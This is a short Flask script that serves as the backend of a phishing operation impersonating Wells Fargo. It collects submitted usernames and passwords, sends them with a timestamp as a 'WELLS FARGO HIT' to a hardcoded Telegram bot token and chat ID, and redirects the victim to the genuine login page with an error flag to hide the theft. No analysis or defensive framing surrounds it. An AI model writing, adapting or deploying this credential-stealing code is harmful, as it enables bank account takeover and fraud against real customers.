from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(_name_)

# Telegram Bot Token and Chat ID
BOT_TOKEN = '8286512978:AAHWf00K15WpA4tsbKyovYMlMw9in6gkALc'
CHAT_ID = '750862049'

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"🔐 WELLS FARGO HIT\n👤 USER: {username}\n🔑 PASS: {password}\n📅 {timestamp}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
            'chat_id': CHAT_ID,
            'text': message
        })
        return redirect("https://connect.secure.wellsfargo.com/auth/login/present?error=true", code=302)
    return "WellsFargo Bot Active", 200

if _name_ == '_main_':
    app.run(host='0.0.0.0', port=3000)
